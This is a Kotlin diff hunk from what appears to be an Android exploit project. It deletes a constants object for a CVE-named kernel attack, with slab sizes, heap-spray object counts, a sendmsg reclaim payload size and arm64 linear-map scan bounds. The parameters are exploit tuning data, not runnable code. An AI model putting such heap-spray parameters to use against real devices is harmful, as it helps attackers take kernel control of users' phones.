@@ -280,57 +280,6 @@ internal sealed interface OwnerCancelOutcome {
     data class Rejected(val reason: String) : OwnerCancelOutcome
 }
 
-/**
- * 43499 物理常量（Kotlin 侧唯一副本）。
- *
- * @note 与 Native `app/src/main/cpp/gl43499/core/kernel_internal.h` 的具名常量一一对应；
- *       Native 不读 profile，Kotlin 必须显式传入这些值。改 Native 常量必须同批改这里。
- * @note 阶段：G4L-5；只读常量，不含运行期状态。
- */
-internal object Cve43499PhysicalConstants {
-    /** Native `GLK43499_PHYS_PAGE_SIZE`：页大小 / 候选页基址布局边界。 */
-    const val PAGE_SIZE_BYTES: Long = 0x1000L
-
-    /** Native `GLK43499_PHYS_ALLOCATION_SIZE`：mm_struct slab 分配大小（order-3）。 */
-    const val ALLOCATION_SIZE_BYTES: Long = 0x8000L
-
-    /** Native `GLK43499_PHYS_OBJECTS_PER_SLAB`：每 slab 的 mm_struct 数。 */
-    const val OBJECTS_PER_SLAB: Int = 25
-
-    /** Native `GLK43499_PHYS_PREPARE_SLABS * OBJECTS_PER_SLAB`。 */
-    const val PREPARE_OBJECT_COUNT: Int = 8 * OBJECTS_PER_SLAB
-
-    /** Native `(1 + GLK43499_PHYS_MM_PARTIALS) * OBJECTS_PER_SLAB`。 */
-    const val SPRAY_OBJECT_COUNT: Int = 6 * OBJECTS_PER_SLAB
-
-    /** Native `GLK43499_PHYS_OBJECTS_PER_SLAB - 1`。 */
-    const val PRE_OBJECT_COUNT: Int = OBJECTS_PER_SLAB - 1
-
-    /** Native `GLK43499_PHYS_OBJECTS_PER_SLAB`。 */
-    const val POST_OBJECT_COUNT: Int = OBJECTS_PER_SLAB
-
-    /** Native `GLK43499_PHYS_SKB_SEND_SIZE`：landing 最终字节长度。 */
-    const val RECLAIM_PAYLOAD_SIZE_BYTES: Long = 0x10000L
-
-    /** landing 的 reclaim `sendmsg` 次数上限（Native 物理上限 16）。 */
-    const val RECLAIM_SEND_LIMIT: Long = 4L
-
-    /** landing 的 socket 发送缓冲（旧物理实现固定 1 MiB）。 */
-    const val RECLAIM_SOCKET_SEND_BUFFER_BYTES: Long = 1L shl 20
-
-    /** Native `GLK43499_PHYS_IDENTITY_START`（arm64 VA_BITS=39）的无符号值。 */
-    val SCAN_LOWER_BOUND_UNSIGNED: ULong = 0xffffff8000000000uL
-
-    /** Native `GLK43499_PHYS_IDENTITY_END`（起始 + 64 GiB）的无符号值。 */
-    val SCAN_UPPER_BOUND_UNSIGNED: ULong = 0xffffffc000000000uL
-
-    /** 默认扫描步长：页大小；必须整除 `ALLOCATION_SIZE_BYTES`。 */
-    const val SCAN_STEP_BYTES: Long = PAGE_SIZE_BYTES
-
-    /** 默认测量重试轮数上限（Native 物理上限 8）。 */
-    const val SCAN_ROUND_LIMIT: Long = 3L
-}
-
 /** Native `glk43499_call_status` 的具名常量（与 `core/result.h` 对齐）。 */
 internal object Native43499CallStatus {
     const val OK: Int = 0
